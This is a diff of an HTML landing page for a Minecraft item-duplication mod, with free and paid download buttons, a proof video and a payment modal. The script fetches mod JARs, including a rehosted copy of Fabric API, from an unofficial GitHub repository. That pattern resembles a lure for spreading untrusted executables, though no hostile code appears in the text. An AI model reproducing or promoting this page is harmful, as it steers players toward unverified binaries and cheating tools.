@@ -5,25 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dupe Mod · 1.21 – 1.21.11</title>
     <style>
-        /* ── RESET ── */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        /* ── RESET & BASE ── */
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: 'Courier New', Consolas, 'Segoe UI', monospace;
+            font-family: 'Courier New', Consolas, monospace;
             background: #1a1512;
             padding: 20px;
             image-rendering: pixelated;
         }
-
-        /* ── MAIN BOX ── */
         .mod-panel {
             max-width: 780px;
             width: 100%;
@@ -31,10 +24,9 @@
             border: 4px solid #5d4b3a;
             border-radius: 12px;
             padding: 32px 30px 28px;
-            box-shadow: inset 0 0 0 2px #1f1812, 0 16px 48px rgba(0, 0, 0, 0.8);
+            box-shadow: inset 0 0 0 2px #1f1812, 0 16px 48px rgba(0,0,0,0.8);
             color: #d4c9b8;
         }
-
         .mod-panel::before {
             content: "⬛ DUPE MOD v2.4.1";
             display: block;
@@ -50,494 +42,78 @@
             border-radius: 8px 8px 0 0;
             font-family: 'Courier New', monospace;
         }
-
-        .mod-header {
-            display: flex;
-            align-items: center;
-            gap: 18px;
-            margin-bottom: 6px;
-            flex-wrap: wrap;
+        .mod-header { display:flex; align-items:center; gap:18px; margin-bottom:6px; flex-wrap:wrap; }
+        .mod-icon { width:64px; height:64px; background:#3f3328; border:3px solid #6b5542; image-rendering:pixelated; flex-shrink:0; object-fit:contain; }
+        .mod-title h1 { font-size:2.2rem; font-weight:700; color:#f5e6c8; text-shadow:0 2px 0 #1f1812; letter-spacing:-0.5px; font-family:'Courier New',monospace; }
+        .mod-title .version-range { display:inline-block; background:#3f3328; padding:3px 16px; border:2px solid #6b5542; font-size:0.8rem; font-weight:700; color:#ffb347; letter-spacing:0.5px; margin-top:4px; text-transform:uppercase; }
+        .mod-description { background:#1f1812; border:2px solid #3f3328; padding:18px 22px; margin:18px 0 22px; font-size:0.95rem; line-height:1.6; color:#c4b59e; box-shadow:inset 0 4px 8px rgba(0,0,0,0.4); }
+        .mod-description strong { color:#f5e6c8; }
+        .mod-description .mc-version { background:#2c241c; padding:2px 10px; border:1px solid #5d4b3a; color:#8fcdff; font-weight:700; }
+        .how-to { margin-top:12px; padding-top:12px; border-top:2px dashed #3f3328; }
+        .how-to span { display:block; font-weight:700; color:#f5e6c8; margin-bottom:6px; font-size:1rem; }
+        .how-to ol { list-style:none; counter-reset:step; padding-left:0; }
+        .how-to ol li { counter-increment:step; padding:4px 0 4px 32px; position:relative; font-size:0.92rem; }
+        .how-to ol li::before { content:counter(step); position:absolute; left:0; top:4px; width:22px; height:22px; background:#3f3328; border:2px solid #6b5542; color:#ffb347; font-weight:700; font-size:0.7rem; display:flex; align-items:center; justify-content:center; }
+        .feature-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px 20px; margin:10px 0 4px; padding-left:4px; }
+        .feature-grid li { list-style:none; padding:2px 0 2px 18px; position:relative; font-size:0.88rem; }
+        .feature-grid li::before { content:"▸"; color:#ffb347; position:absolute; left:0; }
+        .video-section { margin:20px 0 22px; background:#1f1812; border:2px solid #3f3328; padding:14px 16px 16px; box-shadow:inset 0 4px 8px rgba(0,0,0,0.4); }
+        .video-section .video-header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; margin-bottom:10px; }
+        .video-section .video-header span { font-weight:700; color:#f5e6c8; font-size:1rem; letter-spacing:0.5px; }
+        .video-section .video-header .proof-download-btn { background:#3f3328; border:2px solid #6b5542; color:#f5e6c8; padding:6px 18px; font-family:'Courier New',monospace; font-weight:700; font-size:0.8rem; text-transform:uppercase; cursor:pointer; border-radius:4px; text-decoration:none; display:inline-block; }
+        .video-section .video-header .proof-download-btn:hover { background:#5d4b3a; border-color:#8a735a; }
+        .video-wrapper { position:relative; background:#0c0a08; border:2px solid #3f3328; aspect-ratio:16/9; overflow:hidden; display:flex; align-items:center; justify-content:center; }
+        .video-wrapper video { width:100%; height:100%; display:block; background:#0c0a08; }
+        .video-loading { position:absolute; inset:0; background:#1f1812; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#b7a48b; font-size:0.9rem; transition:opacity 0.3s; z-index:2; pointer-events:none; }
+        .video-loading.hidden { opacity:0; pointer-events:none; }
+        .spinner { width:40px; height:40px; border:4px solid #3f3328; border-top:4px solid #ffb347; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:12px; }
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        .video-error { display:none; color:#ff6b6b; font-weight:700; padding:20px; text-align:center; }
+        .video-error.show { display:block; }
+        .button-group { display:flex; flex-wrap:wrap; gap:16px; justify-content:center; margin:20px 0 10px; }
+        .btn { flex:1 1 160px; min-width:140px; padding:14px 10px; border:3px solid #5d4b3a; background:#3f3328; color:#f5e6c8; font-family:'Courier New',monospace; font-weight:700; font-size:1rem; text-transform:uppercase; letter-spacing:0.5px; cursor:pointer; transition:all 0.08s linear; box-shadow:inset 0 -4px 0 #1f1812; text-shadow:0 1px 0 #1f1812; text-align:center; border-radius:4px; }
+        .btn .sub { display:block; font-weight:400; font-size:0.6rem; text-transform:none; color:#b7a48b; margin-top:2px; letter-spacing:0; }
+        .btn-test { border-color:#4a6b7a; background:#2a3d47; }
+        .btn-test:hover { background:#3a5563; border-color:#6b9bb0; transform:scale(1.02); }
+        .btn-paid { border-color:#7a6a3a; background:#4d3f28; }
+        .btn-paid:hover { background:#6b552f; border-color:#c4a040; transform:scale(1.02); }
+        .btn-fabric { flex:0 1 auto; min-width:180px; border-color:#5d4b3a; background:#2c241c; display:inline-flex; align-items:center; justify-content:center; gap:12px; padding:10px 24px; font-size:0.85rem; }
+        .btn-fabric:hover { background:#3f3328; border-color:#8a735a; transform:scale(1.02); }
+        .btn-fabric .fabric-icon { width:28px; height:28px; background:#5d4b3a; border:2px solid #8a735a; object-fit:contain; image-rendering:pixelated; flex-shrink:0; }
+        .btn:active { transform:scale(0.94) !important; box-shadow:inset 0 2px 0 #1f1812; }
+        .footer-note { margin-top:22px; font-size:0.65rem; text-align:center; color:#6b5542; border-top:2px solid #2c241c; padding-top:16px; letter-spacing:0.5px; text-transform:uppercase; }
+        .modal-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.75); z-index:1000; align-items:center; justify-content:center; padding:20px; }
+        .modal-overlay.active { display:flex; }
+        .modal-box { background:#2c241c; border:4px solid #5d4b3a; padding:32px 28px 28px; max-width:420px; width:100%; color:#d4c9b8; position:relative; box-shadow:0 20px 60px rgba(0,0,0,0.9); }
+        .modal-close { position:absolute; top:8px; right:14px; background:none; border:none; color:#6b5542; font-size:1.8rem; cursor:pointer; font-family:monospace; }
+        .modal-close:hover { color:#f5e6c8; }
+        .modal-box h2 { color:#ffb347; font-family:'Courier New',monospace; font-size:1.4rem; text-transform:uppercase; margin-bottom:4px; }
+        .modal-box p { color:#b7a48b; font-size:0.9rem; margin-bottom:20px; }
+        .modal-box label { display:block; font-size:0.75rem; text-transform:uppercase; color:#8a735a; margin-bottom:4px; letter-spacing:0.5px; }
+        .modal-box input { width:100%; padding:10px 12px; background:#1f1812; border:2px solid #3f3328; color:#f5e6c8; font-family:monospace; font-size:0.95rem; margin-bottom:16px; outline:none; }
+        .modal-box input:focus { border-color:#6b5542; }
+        .modal-box .submit-btn { width:100%; padding:12px; background:#3f3328; border:3px solid #5d4b3a; color:#f5e6c8; font-family:'Courier New',monospace; font-weight:700; font-size:1rem; text-transform:uppercase; cursor:pointer; transition:0.1s; }
+        .modal-box .submit-btn:hover { background:#5d4b3a; border-color:#8a735a; }
+        .modal-box .success-msg { display:none; text-align:center; padding:10px 0; color:#8fcdff; font-weight:700; }
+        .modal-box .success-msg.show { display:block; }
+        @media (max-width:600px) {
+            .mod-panel { padding:20px 14px 18px; }
+            .mod-panel::before { margin:-20px -14px 16px -14px; padding:4px 12px; font-size:0.6rem; }
+            .mod-title h1 { font-size:1.6rem; }
+            .mod-icon { width:48px; height:48px; }
+            .feature-grid { grid-template-columns:1fr; }
+            .btn { flex:1 1 100%; min-width:100%; }
+            .btn-fabric { flex:1 1 100%; }
+            .video-section .video-header { flex-direction:column; align-items:flex-start; gap:8px; }
         }
-
-        .mod-icon {
-            width: 64px;
-            height: 64px;
-            background: #3f3328;
-            border: 3px solid #6b5542;
-            image-rendering: pixelated;
-            flex-shrink: 0;
-            object-fit: contain;
-        }
-
-        .mod-title h1 {
-            font-size: 2.2rem;
-            font-weight: 700;
-            color: #f5e6c8;
-            text-shadow: 0 2px 0 #1f1812;
-            letter-spacing: -0.5px;
-            font-family: 'Courier New', monospace;
-        }
-
-        .mod-title .version-range {
-            display: inline-block;
-            background: #3f3328;
-            padding: 3px 16px;
-            border: 2px solid #6b5542;
-            font-size: 0.8rem;
-            font-weight: 700;
-            color: #ffb347;
-            letter-spacing: 0.5px;
-            margin-top: 4px;
-            text-transform: uppercase;
-        }
-
-        .mod-description {
-            background: #1f1812;
-            border: 2px solid #3f3328;
-            padding: 18px 22px;
-            margin: 18px 0 22px;
-            font-size: 0.95rem;
-            line-height: 1.6;
-            color: #c4b59e;
-            box-shadow: inset 0 4px 8px rgba(0, 0, 0, 0.4);
-        }
-
-        .mod-description strong {
-            color: #f5e6c8;
-        }
-        .mod-description .highlight {
-            color: #ffb347;
-        }
-        .mod-description .mc-version {
-            background: #2c241c;
-            padding: 2px 10px;
-            border: 1px solid #5d4b3a;
-            color: #8fcdff;
-            font-weight: 700;
-        }
-
-        .how-to {
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 2px dashed #3f3328;
-        }
-        .how-to span {
-            display: block;
-            font-weight: 700;
-            color: #f5e6c8;
-            margin-bottom: 6px;
-            font-size: 1rem;
-        }
-        .how-to ol {
-            list-style: none;
-            counter-reset: step;
-            padding-left: 0;
-        }
-        .how-to ol li {
-            counter-increment: step;
-            padding: 4px 0 4px 32px;
-            position: relative;
-            font-size: 0.92rem;
-        }
-        .how-to ol li::before {
-            content: counter(step);
-            position: absolute;
-            left: 0;
-            top: 4px;
-            width: 22px;
-            height: 22px;
-            background: #3f3328;
-            border: 2px solid #6b5542;
-            color: #ffb347;
-            font-weight: 700;
-            font-size: 0.7rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .feature-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 6px 20px;
-            margin: 10px 0 4px;
-            padding-left: 4px;
-        }
-        .feature-grid li {
-            list-style: none;
-            padding: 2px 0 2px 18px;
-            position: relative;
-            font-size: 0.88rem;
-        }
-        .feature-grid li::before {
-            content: "▸";
-            color: #ffb347;
-            position: absolute;
-            left: 0;
-        }
-
-        /* ── VIDEO SECTION ── */
-        .video-section {
-            margin: 20px 0 22px;
-            background: #1f1812;
-            border: 2px solid #3f3328;
-            padding: 14px 16px 16px;
-            box-shadow: inset 0 4px 8px rgba(0, 0, 0, 0.4);
-            position: relative;
-        }
-
-        .video-section .video-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            margin-bottom: 10px;
-        }
-
-        .video-section .video-header span {
-            font-weight: 700;
-            color: #f5e6c8;
-            font-size: 1rem;
-            letter-spacing: 0.5px;
-        }
-
-        .video-section .video-header .proof-download-btn {
-            background: #3f3328;
-            border: 2px solid #6b5542;
-            color: #f5e6c8;
-            padding: 6px 18px;
-            font-family: 'Courier New', monospace;
-            font-weight: 700;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: all 0.1s linear;
-            border-radius: 4px;
-            text-decoration: none;
-            display: inline-block;
-        }
-
-        .video-section .video-header .proof-download-btn:hover {
-            background: #5d4b3a;
-            border-color: #8a735a;
-        }
-
-        .video-wrapper {
-            position: relative;
-            background: #0c0a08;
-            border: 2px solid #3f3328;
-            aspect-ratio: 16 / 9;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .video-wrapper video {
-            width: 100%;
-            height: 100%;
-            display: block;
-            background: #0c0a08;
-        }
-
-        /* Loading overlay */
-        .video-loading {
-            position: absolute;
-            inset: 0;
-            background: #1f1812;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: #b7a48b;
-            font-size: 0.9rem;
-            transition: opacity 0.3s;
-            z-index: 2;
-            pointer-events: none;
-        }
-
-        .video-loading.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #3f3328;
-            border-top: 4px solid #ffb347;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 12px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .video-error {
-            display: none;
-            color: #ff6b6b;
-            font-weight: 700;
-            padding: 20px;
-            text-align: center;
-        }
-        .video-error.show {
-            display: block;
-        }
-
-        /* ── BUTTONS ── */
-        .button-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 16px;
-            justify-content: center;
-            margin: 20px 0 10px;
-        }
-
-        .btn {
-            flex: 1 1 160px;
-            min-width: 140px;
-            padding: 14px 10px;
-            border: 3px solid #5d4b3a;
-            background: #3f3328;
-            color: #f5e6c8;
-            font-family: 'Courier New', monospace;
-            font-weight: 700;
-            font-size: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            cursor: pointer;
-            transition: all 0.08s linear;
-            box-shadow: inset 0 -4px 0 #1f1812;
-            text-shadow: 0 1px 0 #1f1812;
-            text-align: center;
-            border-radius: 4px;
-        }
-        .btn .sub {
-            display: block;
-            font-weight: 400;
-            font-size: 0.6rem;
-            text-transform: none;
-            color: #b7a48b;
-            margin-top: 2px;
-            letter-spacing: 0;
-        }
-
-        .btn-test {
-            border-color: #4a6b7a;
-            background: #2a3d47;
-        }
-        .btn-test:hover {
-            background: #3a5563;
-            border-color: #6b9bb0;
-            transform: scale(1.02);
-        }
-
-        .btn-paid {
-            border-color: #7a6a3a;
-            background: #4d3f28;
-        }
-        .btn-paid:hover {
-            background: #6b552f;
-            border-color: #c4a040;
-            transform: scale(1.02);
-        }
-
-        .btn-fabric {
-            flex: 0 1 auto;
-            min-width: 180px;
-            border-color: #5d4b3a;
-            background: #2c241c;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            padding: 10px 24px;
-            font-size: 0.85rem;
-        }
-        .btn-fabric:hover {
-            background: #3f3328;
-            border-color: #8a735a;
-            transform: scale(1.02);
-        }
-
-        .btn-fabric .fabric-icon {
-            width: 28px;
-            height: 28px;
-            background: #5d4b3a;
-            border: 2px solid #8a735a;
-            object-fit: contain;
-            image-rendering: pixelated;
-            flex-shrink: 0;
-        }
-
-        .btn:active {
-            transform: scale(0.94) !important;
-            box-shadow: inset 0 2px 0 #1f1812;
-        }
-
-        .footer-note {
-            margin-top: 22px;
-            font-size: 0.65rem;
-            text-align: center;
-            color: #6b5542;
-            border-top: 2px solid #2c241c;
-            padding-top: 16px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        /* ── MODAL ── */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.75);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .modal-overlay.active {
-            display: flex;
-        }
-        .modal-box {
-            background: #2c241c;
-            border: 4px solid #5d4b3a;
-            padding: 32px 28px 28px;
-            max-width: 420px;
-            width: 100%;
-            color: #d4c9b8;
-            position: relative;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9);
-        }
-        .modal-close {
-            position: absolute;
-            top: 8px;
-            right: 14px;
-            background: none;
-            border: none;
-            color: #6b5542;
-            font-size: 1.8rem;
-            cursor: pointer;
-            font-family: monospace;
-        }
-        .modal-close:hover {
-            color: #f5e6c8;
-        }
-        .modal-box h2 {
-            color: #ffb347;
-            font-family: 'Courier New', monospace;
-            font-size: 1.4rem;
-            text-transform: uppercase;
-            margin-bottom: 4px;
-        }
-        .modal-box p {
-            color: #b7a48b;
-            font-size: 0.9rem;
-            margin-bottom: 20px;
-        }
-        .modal-box label {
-            display: block;
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            color: #8a735a;
-            margin-bottom: 4px;
-            letter-spacing: 0.5px;
-        }
-        .modal-box input {
-            width: 100%;
-            padding: 10px 12px;
-            background: #1f1812;
-            border: 2px solid #3f3328;
-            color: #f5e6c8;
-            font-family: monospace;
-            font-size: 0.95rem;
-            margin-bottom: 16px;
-            outline: none;
-        }
-        .modal-box input:focus {
-            border-color: #6b5542;
-        }
-        .modal-box .submit-btn {
-            width: 100%;
-            padding: 12px;
-            background: #3f3328;
-            border: 3px solid #5d4b3a;
-            color: #f5e6c8;
-            font-family: 'Courier New', monospace;
-            font-weight: 700;
-            font-size: 1rem;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: 0.1s;
-        }
-        .modal-box .submit-btn:hover {
-            background: #5d4b3a;
-            border-color: #8a735a;
-        }
-        .modal-box .success-msg {
-            display: none;
-            text-align: center;
-            padding: 10px 0;
-            color: #8fcdff;
-            font-weight: 700;
-        }
-        .modal-box .success-msg.show {
-            display: block;
-        }
-
-        /* ── RESPONSIVE ── */
-        @media (max-width: 600px) {
-            .mod-panel {
-                padding: 20px 14px 18px;
-            }
-            .mod-panel::before {
-                margin: -20px -14px 16px -14px;
-                padding: 4px 12px;
-                font-size: 0.6rem;
-            }
-            .mod-title h1 {
-                font-size: 1.6rem;
-            }
-            .mod-icon {
-                width: 48px;
-                height: 48px;
-            }
-            .feature-grid {
-                grid-template-columns: 1fr;
-            }
-            .btn {
-                flex: 1 1 100%;
-                min-width: 100%;
-            }
-            .btn-fabric {
-                flex: 1 1 100%;
-            }
-            .video-section .video-header {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 8px;
-            }
-        }
-        @media (max-width: 420px) {
-            .mod-title h1 {
-                font-size: 1.3rem;
-            }
-            .mod-description {
-                font-size: 0.85rem;
-                padding: 12px 14px;
-            }
+        @media (max-width:420px) {
+            .mod-title h1 { font-size:1.3rem; }
+            .mod-description { font-size:0.85rem; padding:12px 14px; }
         }
     </style>
 </head>
 <body>
-
     <div class="mod-panel">
-
-        <!-- HEADER -->
         <div class="mod-header">
             <img src="moblogo.icon" alt="Mod Logo" class="mod-icon" />
             <div class="mod-title">
@@ -545,14 +121,8 @@
                 <span class="version-range">✔ 1.21.0 – 1.21.11</span>
             </div>
         </div>
-
-        <!-- DESCRIPTION -->
         <div class="mod-description">
-            <p>
-                <strong>Item duplication mod</strong> — works on <span class="mc-version">1.21</span> through <span class="mc-version">1.21.11</span>.
-                Fabric client-side. Singleplayer &amp; multiplayer.
-            </p>
-
+            <p><strong>Item duplication mod</strong> — works on <span class="mc-version">1.21</span> through <span class="mc-version">1.21.11</span>. Fabric client-side. Singleplayer &amp; multiplayer.</p>
             <div class="how-to">
                 <span>⛏ HOW TO USE</span>
                 <ol>
@@ -562,7 +132,6 @@
                     <li>Click the <strong style="color:#ffb347;">Dupe</strong> button → item fills every empty slot.</li>
                 </ol>
             </div>
-
             <ul class="feature-grid">
                 <li>Works with any item (gear, shulkers, etc.)</li>
                 <li>Auto-detects chest size (27 / 54 slots)</li>
@@ -570,42 +139,24 @@
                 <li><strong style="color:#ffb347;">Paid</strong> adds bulk-dupe &amp; priority</li>
             </ul>
         </div>
-
-        <!-- ─── VIDEO SECTION ─── -->
         <div class="video-section">
             <div class="video-header">
                 <span>🎬 Proof Video</span>
                 <a href="proof.mkv" download class="proof-download-btn">⬇ Download Proof</a>
             </div>
             <div class="video-wrapper">
-                <!-- Loading overlay -->
-                <div class="video-loading" id="videoLoading">
-                    <div class="spinner"></div>
-                    <span>Loading proof video...</span>
-                </div>
-                <!-- Video element -->
+                <div class="video-loading" id="videoLoading"><div class="spinner"></div><span>Loading proof video...</span></div>
                 <video id="proofVideo" controls preload="metadata" playsinline>
                     <source src="proof.mkv" type="video/x-matroska">
                     Your browser does not support the video tag.
                 </video>
-                <!-- Error message -->
                 <div class="video-error" id="videoError">⚠️ Failed to load video. Please try the download button.</div>
             </div>
         </div>
-
-        <!-- BUTTONS -->
         <div class="button-group">
-            <button class="btn btn-test" id="testBtn">
-                ⬇ Test
-                <span class="sub">Free · 1 item at a time</span>
-            </button>
-            <button class="btn btn-paid" id="paidBtn">
-                ⬇ Paid
-                <span class="sub">Full · Auto-dupe + support</span>
-            </button>
+            <button class="btn btn-test" id="testBtn">⬇ Test <span class="sub">Free · 1 item at a time</span></button>
+            <button class="btn btn-paid" id="paidBtn">⬇ Paid <span class="sub">Full · Auto-dupe + support</span></button>
         </div>
-
-        <!-- FABRIC API -->
         <div style="display:flex; justify-content:center; margin-top:6px;">
             <button class="btn btn-fabric" id="fabricBtn">
                 <img src="fabricapi.icon" alt="Fabric API" class="fabric-icon" />
@@ -613,13 +164,9 @@
                 <span class="sub" style="display:inline; margin-left:6px; font-size:0.6rem;">1.21.11</span>
             </button>
         </div>
-
-        <div class="footer-note">
-            Requires Fabric API · Compatible 1.21.0 through 1.21.11
-        </div>
+        <div class="footer-note">Requires Fabric API · Compatible 1.21.0 through 1.21.11</div>
     </div>
 
-    <!-- ─── MODAL ─── -->
     <div class="modal-overlay" id="paidModal">
         <div class="modal-box">
             <button class="modal-close" id="modalClose">&times;</button>
@@ -638,9 +185,9 @@
 
     <script>
         (function() {
-            // ─── FREE (TEST) BUTTON ───
+            // ─── FREE (TEST) BUTTON — RAW URL FROM MAIN BRANCH ───
             document.getElementById('testBtn').onclick = function() {
-                var fileUrl = 'https://github.com/minecraftdupe/minecraftdupe/blob/main/dupe-1.21-1.21.11.jar';
+                var fileUrl = 'https://raw.githubusercontent.com/minecraftdupe/minecraftdupe/main/dupe-1.21-1.21.11.jar';
                 var fileName = 'dupe-1.21-1.21.11.jar';
 
                 fetch(fileUrl)
@@ -665,9 +212,9 @@
                     });
             };
 
-            // ─── FABRIC API BUTTON ───
+            // ─── FABRIC API BUTTON — RAW URL ───
             document.getElementById('fabricBtn').onclick = function() {
-                var url = 'https://github.com/minecraftdupe/minecraftdupe/releases/download/mark/fabric-api-0.141.4+1.21.11.jar';
+                var url = 'https://raw.githubusercontent.com/minecraftdupe/minecraftdupe/main/fabric-api-0.141.4+1.21.11.jar';
                 var filename = 'fabric-api-0.141.4+1.21.11.jar';
                 fetch(url)
                     .then(response => {
